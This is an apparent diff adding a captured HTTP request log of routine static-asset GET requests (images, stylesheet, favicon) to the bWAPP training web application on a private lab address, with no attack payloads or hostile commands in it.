+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=00jtf56fpbluq1psidgmts21j5
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=00jtf56fpbluq1psidgmts21j5
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=00jtf56fpbluq1psidgmts21j5
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=00jtf56fpbluq1psidgmts21j5
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=00jtf56fpbluq1psidgmts21j5
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=00jtf56fpbluq1psidgmts21j5
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=00jtf56fpbluq1psidgmts21j5
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_3.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/sb_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_2.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php?name=abc
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php?name=abc
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php?name=abc
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php?name=abc
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php?name=abc
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=dedv2avnhoksheguv2p5369426
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=dedv2avnhoksheguv2p5369426
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=dedv2avnhoksheguv2p5369426
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=dedv2avnhoksheguv2p5369426
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=dedv2avnhoksheguv2p5369426
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=dedv2avnhoksheguv2p5369426
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=dedv2avnhoksheguv2p5369426
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=4ug1aqh62se5p48agnovnd6ni6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=4ug1aqh62se5p48agnovnd6ni6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=4ug1aqh62se5p48agnovnd6ni6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=4ug1aqh62se5p48agnovnd6ni6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=4ug1aqh62se5p48agnovnd6ni6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=4ug1aqh62se5p48agnovnd6ni6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=4ug1aqh62se5p48agnovnd6ni6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_2.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=4ug1aqh62se5p48agnovnd6ni6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_3.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=4ug1aqh62se5p48agnovnd6ni6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/sb_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=4ug1aqh62se5p48agnovnd6ni6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=4ug1aqh62se5p48agnovnd6ni6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=ebe0dqk7k4k6pgl716ce1pb6q0
+Sec-Fetch-Dest: style
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=ebe0dqk7k4k6pgl716ce1pb6q0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=ebe0dqk7k4k6pgl716ce1pb6q0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=ebe0dqk7k4k6pgl716ce1pb6q0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=ebe0dqk7k4k6pgl716ce1pb6q0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=ebe0dqk7k4k6pgl716ce1pb6q0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=ebe0dqk7k4k6pgl716ce1pb6q0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_3.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=ebe0dqk7k4k6pgl716ce1pb6q0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=ebe0dqk7k4k6pgl716ce1pb6q0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_2.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=ebe0dqk7k4k6pgl716ce1pb6q0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/sb_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=ebe0dqk7k4k6pgl716ce1pb6q0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/mk.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=noki0tb0gstrv30h8apdljku90; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/netsparker.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=noki0tb0gstrv30h8apdljku90; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/owasp.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=noki0tb0gstrv30h8apdljku90; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/zap.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=noki0tb0gstrv30h8apdljku90; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=p2mj8n4g0tmto4tsn7t5tiu4a3
